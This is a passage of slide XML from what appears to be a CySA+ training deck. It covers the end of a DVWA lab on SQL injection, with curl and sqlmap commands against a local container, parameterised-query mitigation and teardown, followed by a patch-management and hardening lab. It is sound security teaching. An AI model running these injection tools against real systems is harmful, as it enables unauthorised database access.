        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: SQL Injection — manual</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>vulnerabilities/sqli/?id= builds a SQL query by concatenation.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ curl -s -b "$COOKIE" "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1%2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: SQL Injection — automated with sqlmap</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>sqlmap will:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submi</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615</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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17 — Hands-On Steps (cont'd)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39293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39293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05840" y="22509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2250948"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Mitigation: parameterised queries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The only correct fix for SQLi is parameterised queries / prepared statements.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2205228"/>
            <a:ext cx="3977639" cy="5486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52360" y="2205228"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$stmt = $pdo-&gt;prepare('SELECT first_name, last_name FROM users WHERE use</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3304032"/>
            <a:ext cx="10634472" cy="139293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304032"/>
            <a:ext cx="91440" cy="139293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005840" y="377190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3771900"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3304032"/>
            <a:ext cx="9509760" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Map the lab to CySA+ 2.4 secure-coding bullets</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4824984"/>
            <a:ext cx="10634472" cy="139293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240" y="4824984"/>
            <a:ext cx="91440" cy="139293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005840" y="5292852"/>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05840" y="5292852"/>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3" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4824984"/>
            <a:ext cx="5486400" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: Tear down</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5247132"/>
            <a:ext cx="3977639" cy="5486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452360" y="5247132"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ docker stop dvwa &amp;&amp; docker rm dvwa</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616</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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17 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Trigger and recognise reflected XSS, stored XSS, and SQL injection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Use curl and sqlmap to validate scanner findings end-to-end.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The correct primary mitigation for each class (encoding, validation, parameterisation).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The link between the OWASP/DVWA exercises and CySA+ 2.4 secure-coding bullets.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617</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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18 — Patch Management and Hardening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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will configure automated patching, list every unpatched CVE on the host, validate a patch with a smoke-test rollback path, and re-score with lynis. This maps to CySA+ 2.5 (Patching and configuration management — Testing / Implementation / Rollback / Validation, Maintenance windows, Attack surface…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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618</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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18 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install patching tools</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y unattended-upgrades debsecan lynis needrest</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: List every unpatched CVE on the host</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>debsecan reads Debian / Ubuntu security tracker data and prints unfixed CVEs by package.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ debsecan --suite=$(lsb_release -cs) --format=summary | head -30</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Enable unattended security upgrades</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>If 20auto-upgrades does not exist, create it:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ dpkg-reconfigure -plow unattended-upgrades 2&gt;/dev/null || true</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Test before patching (CySA+ "Testing")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Patches break things.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ sha256sum /etc/ssh/sshd_config &gt; /tmp/preupdate.hash</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Apply the patch (CySA+ "Implementation")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Inside a real maintenance window you would post-notify stakeholders, then move on.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ DEBIAN_FRONTEND=noninteractive apt -y upgrade</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619</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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18 — Hands-On Steps (cont'd)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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
